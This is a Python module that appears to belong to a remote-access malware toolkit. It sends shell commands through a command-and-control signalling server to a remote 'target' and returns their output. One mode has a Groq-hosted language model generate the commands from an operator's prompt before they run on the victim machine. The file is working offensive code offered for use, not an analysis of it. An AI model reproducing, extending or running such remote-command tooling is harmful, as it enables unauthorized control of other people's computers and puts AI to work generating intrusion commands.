#command/bash/shell.py
import asyncio

from ai_utils.ai import _fallback_command, _extract_command_text
from core.ai.groq.groq_provider import GroqProvider
from malware_signal.signal import SignalClient
from core.data.config import HOST, ROOM
from core.data.client import client_id, username
from injection_utils.remote_command_handler import RemoteCommandHandler as SenderHandler


async def single_bash_mode(target, command):
    print("[+] SINGLE BASH MODE")
    signal = SignalClient(ROOM, client_id, HOST, username=username)
    await signal.connect()

    sender = SenderHandler(signal)
    listener_task = asyncio.create_task(signal.listen())

    try:
        result = await sender.send_command(target, command, wait_for_result=True, timeout=15)
        if result is None:
            print("[-] NO RESPONSE RECEIVED FOR REMOTE COMMAND EXECUTION")
        if result.get("status") == "success":
            print(result.get("output"), "[+] BASH EXECUTED SUCCESSFULLY")
        else:
            print("[!] BASH FAILED")
            print(f"[-] REMOTE COMMAND EXECUTION FAILED: {result.get('error', 'Unknown error')}")
    finally:
        listener_task.cancel()
        try:
            await listener_task
        except asyncio.CancelledError:
            pass
        await signal.close()


async def ai_bash_mode(target, prompt, provider=None):
    print("[+] AI BASH MODE")

    generated_command = ""

    if provider is None:
        try:
            provider = GroqProvider()
        except Exception as exc:
            print(f"[-] AI GENERATION FAILED: {exc}; USING FALLBACK COMMAND")
            generated_command = _fallback_command(prompt)
        else:
            try:
                generated_command = _extract_command_text(provider.generate(prompt))
            except Exception as exc:
                print(f"[-] AI GENERATION FAILED: {exc}; USING FALLBACK COMMAND")
                generated_command = _fallback_command(prompt)
    else:
        try:
            generated_command = _extract_command_text(provider.generate(prompt))
        except Exception as exc:
            print(f"[-] AI GENERATION FAILED: {exc}; USING FALLBACK COMMAND")
            generated_command = _fallback_command(prompt)

    if not generated_command:
        generated_command = _fallback_command(prompt)

    if not generated_command:
        print("[-] AI DID NOT RETURN A VALID COMMAND")
        return

    print(f"[+] GENERATED COMMAND: {generated_command}")

    signal = SignalClient(ROOM, client_id, HOST, username=username)
    await signal.connect()

    sender = SenderHandler(signal)
    listener_task = asyncio.create_task(signal.listen())

    try:
        result = await sender.send_command(target=target, command=generated_command, wait_for_result=True, timeout=300)

        if result is None:
            print("[-] NO RESPONSE RECEIVED FOR REMOTE COMMAND")
            return

        if result.get("status") == "success":
            print(result.get("output", "Bash executed successfully"))
        else:
            print("[-] BASH FAILED")
            print("ERROR:", result.get("error", "Unknown error"))
    finally:
        listener_task.cancel()
        try:
            await listener_task
        except asyncio.CancelledError:
            pass
        await signal.close()
